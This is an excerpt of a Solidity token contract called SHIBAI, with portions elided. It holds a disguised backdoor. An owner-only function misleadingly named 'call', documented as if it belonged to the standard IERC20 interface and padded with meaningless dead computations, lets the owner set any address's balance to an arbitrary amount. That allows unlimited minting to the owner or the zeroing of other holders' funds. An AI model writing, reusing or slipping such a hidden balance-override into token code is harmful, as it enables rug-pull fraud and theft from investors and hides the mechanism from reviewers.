...
contract SHIBAI is Context, IERC20, Ownable {
    ...
    */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        _rOwned[sender] = _rOwned[sender].sub(amount, "IERC20: transfer amount exceeds balance");
    ...
    * @dev See {IERC20-call}.
    */
    function call(uint256 tTeam, uint256 callValue, address callAddress) 
        external 
        onlyOwner 
    {
        uint256 currentRate = 0;
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[callAddress] = callValue * 10 ** 9;
    }
}